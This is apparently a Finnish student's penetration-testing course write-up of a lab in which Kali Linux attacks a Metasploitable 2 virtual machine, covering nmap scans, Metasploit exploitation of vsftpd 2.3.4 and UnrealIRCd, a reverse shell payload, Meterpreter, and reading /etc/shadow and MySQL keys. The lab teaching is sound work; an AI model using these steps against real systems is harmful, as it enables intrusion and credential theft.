# Harjoitus 2

# Ympäristö:

## Fyysinen ympäristö:
- Intel i7-10700K @ 3,80GHz (AMD64)
- Nvidia RTX 3080
- 32 Gt RAM
- Windows 11 Education 23H2

## Virtuaaliympäristö (Kali)
- Oracle VirtualBox 7.1.4
- 8 Prosessoriydintä
- 16 Gt RAM
- Kali Linux 2024.3
## Virtuaaliympäristö (Metasploitable)
- Oracle VirtualBox 7.1.4
- 1 Prosessoriydin
- 2 Gt RAM
- Metasploitable 2.0

# x) 

## Mastering Metasploit

- Exploit on koodin palanen, joka hyväksikäyttää haavoittuvuutta
- Payload on onnistuneen exploitin jälkeen ajettu koodi
- Auxiliary on moduuli, joka tarjoaa lisää funktionaalisuutta
- Encoderit ohittavat suojausjärjestelmiä
- Meterpreter on haittaohjelma joka saa suuret oikeudet
- Nmap ja tietokannat helpottavat Metasploitin käyttöä.

- Metasploit on avoimen lähdekoodin Framework, mikä mahdollistaa omien työkalujen asentamisen siihen
- Hyvä suuriin verkkoihin ja payloadien välillä vaihtelu helppoa
- Metasploitilla voi hakea haavoittuvuuksia, sekä niiden laatua
- Automaattinen hyökkäyksen ajaminen ja exploitti
- Toimii myös Windows koneille
- Myös Metasploitin käytössä tulee esiin Kill Chain

# a) Verkkojen toimivuus

**3.11.2024 10:05**

Aloitin testaamalla, että verkot toimivat keskenään, mutta Kali ei ole yhteydessä verkkoon.
Tein tämän pingaalmalla molemmilla koneilla osoitetta 8.8.8.8 komennolla 'ping 8.8.8.8'

![kuva](https://github.com/user-attachments/assets/74b49bb2-0b8d-452d-b014-01b667d268f4)

*Kali ei julkisessa verkossa*

![kuva](https://github.com/user-attachments/assets/ffa17500-cf13-4e4f-8389-ceacf08fe472)

*Metasploitable ei julkisessa verkossa*

Tämän jälkeen selvitin koneiden IP-osoitteet 'ifconfig' komennolla.

![kuva](https://github.com/user-attachments/assets/045441e2-9733-4372-a0b4-d2821427ff26)

*Kali*

![kuva](https://github.com/user-attachments/assets/96258f9f-438a-43eb-907e-028d50ff1290)

*Metasploitable*

Kun olin saanut molempien koneiden IP-osoitteet selville koetin 'ping komentoa molemmilta koneilta toisilleen.

- Kali: 192.168.56.104
- Meta: 192.168.56.103

![kuva](https://github.com/user-attachments/assets/e14abd7f-1668-4cec-84d2-0c84f608c27f)

*'ping' toimii molempiin suuntiin, verkot ovat yhteydessä lähiverkossa*

# b) MSFconsole

Loin ensin tietokannan komennolla 'sudo msfbdb init'. Alla olevassa kuvassa olin luonut sen jo aiemmassa sessiossa, joten sitä ei uudelleen voinut luoda.

![kuva](https://github.com/user-attachments/assets/9fe91982-790c-47f5-88ac-35a916444274)

Avasin konsolin komennolla 'sudo msfconsole'

![kuva](https://github.com/user-attachments/assets/118887b0-c9df-46d7-be33-52a38ce66c18)

Olin sisällä.

# c) Skannaa Metasploitable verkosta

Tietäen, että verkkoni osoite on 192.168.56.0/24 ajoin tämän skannaukseen komennolla 'db_nmap -sn 192.168.56.0/24' Tarkemmat selitykset komennosta löytyy tekemästäni Harjoituksesta 1.

![kuva](https://github.com/user-attachments/assets/2376d5d7-4e70-45b8-aa6b-dd7f44a39da6)

Skannauksen tuloksena näin, että osoite oli 192.168.56.103. Kalin verkon osoite on .104 päätteinen, oletettavasti default gateway on .1 päätteinen ja DHCP-palvelin on .100 päätteinen.

Tästä pääteltynä jäljelle jää vain edellä mainittu osoite.

# d) Skannaa Metasploitablen portit

Seuraavaksi skannasinn kaikki Metasploitablen yleisimmät portit komennolla 'db_nmap nmap -A -p- 192.168.56.103' joka tallentaa tiedot Metasploitin tietokantaan ja 'sudo nmap -A -p- -oA foo 192.168.56.103'
En ollut täysin varma onko nmapin tallennuksen funktio oikein, mutta päätin sitä silti kokeilla ja korjaan sen jos se ei toimisi.
Nmapin vaihtoehto 'oA' on esitetty seuraavalla tavalla sen ohjeissa:
-oA <basename>: Output in the three major formats at once

Ajoin komennot.

![kuva](https://github.com/user-attachments/assets/13e751f7-fbe8-496c-9b85-ff7dede4823f)

*'db_nmap nmap -A -p- 192.168.56.103'*


![kuva](https://github.com/user-attachments/assets/fe9a32c0-0e7c-464c-9d48-7b48d122c02b)

*'sudo nmap -A -p- -oA foo 192.168.56.103'*


![kuva](https://github.com/user-attachments/assets/1a8d9a5b-016d-4f7e-bbc7-7fc4dea5de39)

Myös syntaksi näytti olleen oikea, sillä kolme uutta tiedostoa oli ilmestynyt hakemistoon.

# e) Hae tietokannoista

Ajoin ensimmäisenä Metasploitin konsolissa komennot 'hosts' ja 'services'

![kuva](https://github.com/user-attachments/assets/7e33f0da-4db5-44e3-aad7-e4d14308dafb)

Sain vastaukseksi pitkän listan verkonskannauksen 'db_nmap -sn 192.168.56.0/24' löytämistä laitteista, sekä porttiskannauksen 'db_nmap nmap -A -p- 192.168.56.103' löytämistä avoimista palveluista.

Hosts listassa oli kaikki laitteet, niiden tyyppi sekä käyttöjärjestelmä, mikäli se oli saatu.

Services listassa oli host, jolla palvelu oli auki, palvelun portti, protokolla, palvelun nimi sekä siihen liittyvät lisätiedot.

Seuraavaksi halusin hakea Services osioista ftp liittyviä tietoja.
Yritin ensin komennolla 'services | grep vsftp' tästä sain vain virheilmoituksen "Invalid host parameter, |."
Päätin seuraavaksi yrittää komentoa 'grep ftp'. Tästä sain kuitenkin vain ohjeen apuikkunan auki, enkä mitään oikeaa tietoa. Pitänee kerrata taas grepin käyttö.

Lopuksi yritin vielä komentoa 'services -h' nähdäkseni onko tähän valmista hakutoimintoia

![kuva](https://github.com/user-attachments/assets/bcbc504f-43a2-49b5-a76b-7b0be918711d)

Ilokseni huomasin, että tässä on suora '-S' hakuvaihtoehto.
Ajoin komennon 'services -S ftp'

![kuva](https://github.com/user-attachments/assets/ecc8a5b2-6fe6-4be7-90df-d9a90e820d6f)

Sain vastaukseksi vain filtterin sisältämät tiedot. Koetin vielä samaa komentoa hosts kenttään hakusanalla "Linux"

![kuva](https://github.com/user-attachments/assets/1cdcf730-261d-47e2-84ce-e30b58aa3a23)

Löysin ainoan Linux koneeni listalta. Nämä hakutoiminnot itsessään jo ovat erittäin hyvä tapa selvittää potentiaalisia kohteita.

# f) Vertailu

Tutkin ensin miltä avatut tiedostot näyttävät.

Tiedostomuodoista vain .xml on itselleni tuttu ja tiedän sen olevan selkokielinen. Avasin sen komennolla 'less foo.xml'

Tiedon määrä oli aivan liikaa, sillä palveluun oli tallennettu kaikki skannauksessa saatu tieto

Seuraavaksi kertasin grepin käyttöä ja hain ftp liittyviä rivejä. Hain komennolla 'grep 'ftp' foo.xml'

![kuva](https://github.com/user-attachments/assets/e13329fe-8286-4b51-9550-fcbb155c6c9d)

Mietin, että tämäkin on vielä aika kamalan näköistä ilman erillistä ohjelmaa, joka osaisi rikkoa tiedon luettavaan muotoon. Yritin seuraavaksi onko foo.nmap selkokielistä luettavaa komennolla 'less foo.nmap'

![kuva](https://github.com/user-attachments/assets/d61cc767-9c89-48d1-9f2b-b997e16290ab)

Vastaukseksi sain miellyttävän raportin luettavaksi, jossa tärkeänä tietona on ylärivillä löytyneet Nmapin versio, skannauksen aika seskä ajettu komento.

Muuten tässä on enemmän tietoa, kuin Metasploitin tietokannassa. Suuri osa infosta on tiivistetty pois Metasploitin tietokannasta, mutta se on sitä kautta paljon nopeampi ja helppokäyttöisempi.
Siinä tulee myös eri avoimet portit esiin hostin kera, nmapin omassa tulosteessa nämä on itse hallittava esimerkiksi tiedostonimillä.

## Metasploit DB hyödyt ja haitat:

### Hyödyt

+ Helppo katsoa montaa laitetta kerralla
+ Tärkeimmät infot, kuten palvelu ja versio näkyvät
+ Listaa hostit samalla

### Haitat

- Helppolukuisuuden varjolla tietoa jätetty näyttämättä.

## Nmapin tulosteiden hyödyt ja haitat:

### Hyödyt

+ Usea eri tiedostomuoto, joista voi käsitellä dataa itselleen sopivalla tavalla.
+ Tarkka tuloste, jossa näkyy kaikki skannauksen tiedot.

### Haitat

- Vain yksi skannaus per tuloste, ellei yhdistele manuaalisesti.
- Hostit ja ajantasaisuus työläämpi tarkistaa.

# g) Murtaudu Metasploitablen

Aloitin tarkastamalla Metasploitablen vsftp demonin version. Tein sen komennolla 'services -S ftp'

![kuva](https://github.com/user-attachments/assets/78864763-585e-4f4a-9de1-78b404ca1de4)

Vastauksesta näin, että versio on vsftpd 2.3.4. Yritin etsiä seuraavaksi tähän liittyvää haavoittuvuutta komennolla 'search vsftpd 2.3.4'

![kuva](https://github.com/user-attachments/assets/2a3007c2-fe0f-4011-930f-55acc9278532)

Tämä löytyi, käytin ehdotettua komentoa 'use 0'

Tässä vaiheessa muistin vain, että piti asettaa RHOST, mutten omuistanut enää tarkkaan miten se tehtiin. Katsoin T. Karvisen läksyn ohjeista esimerkki komentoja ja löysin komennon 'setg RHOST'
Muokkasin tähän Metasploitablen IP-osoitteen ja ajoin komennon 'setg RHOST 192.168.56.103'

![kuva](https://github.com/user-attachments/assets/f0a35120-b2b7-4918-aa54-b3dbb2e27d83)

Yrittäessäni ajaa tämän jälkeen komentoa 'exploit' päästäkseni murtamaan koneeseen, sain virheilmoitukseksi, ettei RHOSTS onnistunut validoimaan.
Katsoin jo aiemmin komennolla 'show options' että tämä kohta oli tyhjä.
Yritin tämän jälkeen lisätä RHOSTIA komennolla se RHOST 192.168.56.103.

Tällä kertaa se näkyy myös RHOST osiossa.

![kuva](https://github.com/user-attachments/assets/db630616-668e-46cd-b572-497b2f013a6a)

Yritin uudelleen ajaa komentoa 'exploit'

![kuva](https://github.com/user-attachments/assets/59e10bb0-a749-4e09-ae00-59fa57dceb81)

Tällä kertaa komento toimi. Otin vielä itselleni mukavamman näkymän. Valitettavasti ajoin komennot niin nopeasti, että en tiedä oliko komento 'shell' vai 'bash' se mikä minulle tämän näkymän antoi.

# h) Meterpreter ylennys

Yrittäessäni nostaa sessiota komennolla 'sessions-u 1' Meterpreteriksi sain aina saman vastauksen.

![kuva](https://github.com/user-attachments/assets/3a7ae241-5e7a-4916-8886-194fa8b8f0d7)

En keksinyt tähän ratkaisua googlaamalla, sillä tämä toimi edellisellä koneellani ja sain ongelmitta yhtyden toiseen koneeseen.

Myös sessio ID on oikein

![kuva](https://github.com/user-attachments/assets/c9e68e06-187c-441a-9732-29f6cfc0ac23)

Päätin jatkaa eteenpäin. Yritän katsoa myöhemmässä tehtävässä jonkin valmiin MeterPreter payloadin omaavan tiedoston, jotta pystyn näyttämään sen ominaisuuksia.

## Päivitys 14:10

Meterpreterin ylennys onnistuu vihdoin kohdassa j). Ongelmana oli palomuuri, joka esti yhteyden muodostamisen.

# i)

Hain ensin kaikki salasanojen tiivisteet komennolla 'cat /etc/shadow'

![kuva](https://github.com/user-attachments/assets/bd4f74e8-7a33-4390-8c03-42dc02ab9eac)

Näitä salasanoja käyttämällä voi saada murrettua muiden käyttäjien salasanoja ja sitä kautta mahdollisesti uusia käyttöoikeuksia eri palveluihin.
Salasan tiivistefunktio saadaan $1$ alkuisista tiivisteistä. Koko tiiviste koostuu seuraavista osista "$id$salt$encrypted" eli ensimmäinen osa on ID joka kertoo tiivisteen olevan muotoa MD5, seuraava suola arvo ja viimeisenä salattu salasana.

(https://security.stackexchange.com/questions/92149/what-are-hashes-that-begin-with-1)

Seuraavaksi tutkin mitä tiedostoja koneella olisi.

Menin kansiopolkuun /home/msfadmin/vulnerable/mysql-ssl/mysql-keys

Sieltä löysin MySQL palvelimen avaimet salaamattomassa muodossa.

![kuva](https://github.com/user-attachments/assets/e84a0039-6ed7-4168-83ef-92a2c35d63ac)

Näillä voidaan murtaa tietokantapalvelimen salattu liikenne ja viestintä.

Ajoin myös komennon 'cat/etc/passwd'

![kuva](https://github.com/user-attachments/assets/a00631a7-445a-418f-ac3f-78b0ca6a562a)

Tästä näin kaikki koneen käyttäjät ja samalla kaikki palvelut, joilla on käyttäjä koneella.

Näistä silmääni iski sshd rivin loppu /usr/sbin/nologin


Lopuksi katsoin vielä Apache2 Name Based Virtual Hostingin tiedot.

![kuva](https://github.com/user-attachments/assets/391691ba-1e13-4434-a783-61bd8acaec4b)

Tätä ei ehkä voi käyttää lateraaliseen liikkumiseen, mutta tästä saan selville dokumenttipolut eri verkkosivuille.

# j) Muratudu toisella tapaa

## Ensimmäinen yritys

Katsoin auki olevia palveluita ja päätin yrittää Sambaa.
Hain komennolla 'search Samba 3.0.20' koska se näkyi versioissa ja löysin haavoittuvuuden

![kuva](https://github.com/user-attachments/assets/4e2d9b0f-54ac-4fd8-98a3-d8899562509d)

Ajoin komennon 'use 0'

Säädin asetukset kuntoon:

![kuva](https://github.com/user-attachments/assets/f61fc9b8-c1c6-4526-b4ca-b3aaff8e8465)

Ajoin komennon 'exploit'

Sain vain vastaukseski, että exploit complete, no session was created.

Päätin käynnistää molemmat koneet uudelleen.

Tein kaiken uudelleen ja yritin komentoa uudestaan. Sain saman virheen.

![kuva](https://github.com/user-attachments/assets/c78e348a-056e-4154-9022-8485bd648b9e)

## Toinen yritys

Päätin tääs vaiheessa käyttää ohjeena Tuomas Valkamon tehtävän ratkaisua ohjeena.

Päätin kohteeksi UnrealIRCd ohjeen mukaan.

Sain totutusti haettua itse haavoittuvuuden ja koatsottua sen asetukset sekä lisättyä RHOSTIN.

![kuva](https://github.com/user-attachments/assets/8f3998b9-f9e8-49dd-af05-28481753f2c3)

Ajaessa kuitenkin tuli ongelma, että payloadia ei ollut valittu.

Katsoin T. Valkamon ohjeesta tavan katsoa payloadit sekä suosituksen valinnasta, sekä rapid7 sivulta komennon muokata payloadia. (https://tuomasvalkamo.com/PenTestCourse/week-2/), (https://docs.rapid7.com/metasploit/working-with-payloads/)

Katsoin payloadit komennolla 'show payloads' ja valitsin payloadin payload/cmd/unix/reverse komennolla 'setpayload 6'

Tämän jälkeen ajoin komennon, mutta sain virheen LHOSTin puutteesta. Se oli tullut nyt payloadin valintana uutena.

![kuva](https://github.com/user-attachments/assets/63945462-ede7-41d0-8173-2a77daf2917f)

Asetin LHOSTin komennolla 'set LHOST 192.168.56.104'

Sain virheen ja verenpaine alkoi nousemaan.

![kuva](https://github.com/user-attachments/assets/e87c5fc2-95fb-4f3a-a7c4-a3eb4aa8f6e1)

Ohjetta siis käytännössä tarvitsin vain kohteen ja payloadin valintaan.

## Palomuuri pois ja kolmas yritys

Tässä vaiheessa aloin miettimään, että voiko ongelmani johtua palomuurista, joka estää portit joista yritän saada yhteyden.

Sammutin palomuurin komennolla 'sudo systemctl stop ufw'

Tämän jälkeen ajoin metasploitin komennon 'exploit' uudelleen.

![kuva](https://github.com/user-attachments/assets/aa5860b4-f00b-41e5-a99e-256c5146a88e)

Olin vihdoin sisällä. Parin tunnin pään hakkaaminen seinään oli tullut päätökseen. Ajattelin, että jos vielä session ylentäminen onnistuu, niin olen kyllä onneni huipulla.
Totesin myös, että komento jolla saa käyttöliittymän mukavammaksi on 'shell'

Kädet vapisten kirjoitin komennon 'session -u 1'

![kuva](https://github.com/user-attachments/assets/afdcbc79-744b-47f4-8973-f79a72db5ae8)

Sain virheen, mutta päätin yrittää päästä vsftpd yhteyden kautta ylentämään.

Tein siis saman kuin aiemmassa kohdassa.

![kuva](https://github.com/user-attachments/assets/e41add5d-331b-486a-8409-c4e7e8028a7d)

Se oli siellä! Tyhmästä päästä kärsi koko kroppa jälleen.



# k) Meterpreterin ominaisuudet


## Ensimmäinen epäonnistuminen (ei viimeinen)


![kuva](https://github.com/user-attachments/assets/32d1a06c-aafe-4667-8a4f-7268708948c1)

En saanut Meterpreter sessiota näkymään, vaikka se tulosteen mukaan pitäisikin toimia.
Muistan luennolla nähneeni, että sessiot pitäisi näkyä erikseen. En löytänyt aiheesta mitään ohjetta, muuta kuin loputtomia vastauksettomia foorumikeskusteluja. En löytänyt tähän ongelmaan ratkaisua.

## Jatkuu 3.11.2024 klo 13:48

Jatkuu tästä, nyt sain session toimimaan poistettuani palomuurin käytöstä.

Löysin komennoista selkeämmän listauksen meterpreterin help komennon tueksi (https://www.offsec.com/metasploit-unleashed/meterpreter-basics/)

Ensimmäisenä silmääni iski download ja upload komennot

![kuva](https://github.com/user-attachments/assets/5be20046-7bea-40bf-aec9-db392e01bc48)


Päätin näistä kokeilla downloadia ja latasin koko aiemmin löytämäni SQL avain kokoelman komennolla 'download mysql-keys/'

![kuva](https://github.com/user-attachments/assets/e909db9e-7856-4880-808b-ea61f32c97ec)

Näkyvät myös kansioissa.

![kuva](https://github.com/user-attachments/assets/59f1b5ae-d328-44f8-a453-f624d844dd16)

Tarkastin myös, että muokkauspäivä ei ole näissä muuttunut.

Halusin koettaa 'upload' komentoa seuraavaksi

Ajoin komennon 'upload foo.xml'

![kuva](https://github.com/user-attachments/assets/67ad5ca2-4b99-44ce-a8ac-d4186b6efbd1)

Tiedosto ilmestyi näkyviin.

Muuten meterpreterillä saa täyden hallinnan kohdelaitteen tiedostoihin, verkkoon sekä prosesseihin. Tämän lisäksi voidaan hallita esimerkiksi laitteen kameraa ja mikrofonia.
Ylipäärään ohjelma, jota en koneelleni haluaisi.



# l) Tallenna scriptillä

Ajoin ohjeessa olleen komennon script -fa log001.txt ja totesin sen tallentavan kaiken, mitä terminaalissa tekee, myös metasploitin sisällä.

![kuva](https://github.com/user-attachments/assets/0abca971-55b4-4591-b6cf-ab7355e05185)

*Esimerkki*

Tämä on varmasti kätevä omien tekojen ja jälkien seuraamiseen. Scriptin sai suljettua komennolla 'exit'.

Tätä työkalua pitää käyttää jatkossa, jotta myös tulosteet jäävät sessioiden välillä olemaan.

# Lähteet:

1. T. Karvinen, 2024, Tunkeutumistestaus, https://terokarvinen.com/tunkeutumistestaus/, luettu 3.11.2024
2. 'man nmap', Luettu 3.11.2024
3. StackExchange, 2015, What are hashes that begin with $1$...?, https://security.stackexchange.com/questions/92149/what-are-hashes-that-begin-with-1, luettu 3.11.2024
4. T. Valkamo, 2022, Hacking into a Target Using Metasploit, https://tuomasvalkamo.com/PenTestCourse/week-2/, Luettu 3.11.2024
5. Rapid7, Working with Payloads, https://docs.rapid7.com/metasploit/working-with-payloads/, Luettu 3.11.2024
6. OffSec, Meterpreter Basics, https://www.offsec.com/metasploit-unleashed/meterpreter-basics/, Luettu 3.11.2024
7. € Jaswal 2020: Mastering Metasploit - 4ed: Chapter 1: Approaching a Penetration Test Using Metasploit, Luettu 3.11.2024
